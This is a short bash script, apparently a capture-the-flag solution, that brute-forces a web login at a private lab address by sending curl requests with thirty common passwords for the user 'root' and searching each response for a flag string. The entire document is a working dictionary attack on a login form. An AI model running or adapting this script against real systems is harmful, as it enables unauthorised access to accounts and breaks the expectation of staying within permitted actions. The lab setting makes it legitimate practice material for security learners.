#!/bin/bash

array=( "password" "123456" "12345678" "1234" "qwerty" "12345"  "dragon"  "pussy"
"baseball"  "football"  "letmein"  "monkey"  "696969"  "abc123"  "mustang"  "michael"  "shadow"
"master"  "jennifer"  "111111"  "2000"  "jordan"  "superman"  "harley"  "1234567"  "fuckme"  "hunter"
"fuckyou"  "trustno1"  "ranger")

for i in "${array[@]}"
do
  curl "http://172.16.150.128/index.php?page=signin&username=root&password=${i}&Login=Login#" > tmp
  echo $i
  cat tmp | grep "The flag is :"
done
